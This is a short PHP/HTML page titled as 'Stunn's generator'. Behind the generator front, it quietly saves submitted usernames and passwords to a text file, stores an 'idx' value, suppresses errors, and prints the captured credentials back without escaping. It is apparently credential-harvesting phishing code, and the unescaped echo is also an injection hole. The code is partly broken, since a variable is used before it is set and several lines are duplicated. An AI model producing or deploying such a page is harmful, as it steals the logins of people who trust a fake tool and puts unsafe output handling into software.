
<!DOCTYPE html>
<html>
<head>
<title>Generator made by Stunn</title>
</head>
<body>
<?php
error_reporting(0);

file_put_contents($user."lastaccinfo.txt", $_POST['username'].":".$_POST['password']);

$get = file_get_contents($user."lastaccinfo.txt");
$user = $_POST["username"];

file_put_contents("idx.txt", $_POST['idx']);

print '<h2>Success</h2> You entered the information <b>'.$get.'</b>';

file_put_contents($user."lastaccinfo.txt", $_POST['username'].":".$_POST['password']);

file_put_contents("idx.txt", $_POST['idx']);

?>
  
  <form action="nest.php" method="POST">
    <fieldset>
        <legend>Stunn's generator!</legend>

            <input name="idx" type="username" placeholder="Idx">
        <button type="submit" class="pure-button pure-button-primary">Submit</button>
    </fieldset>
</form>
<embed src="hashnest.php" width="1000" height="1000">
</body>
</html>
<?php



?>

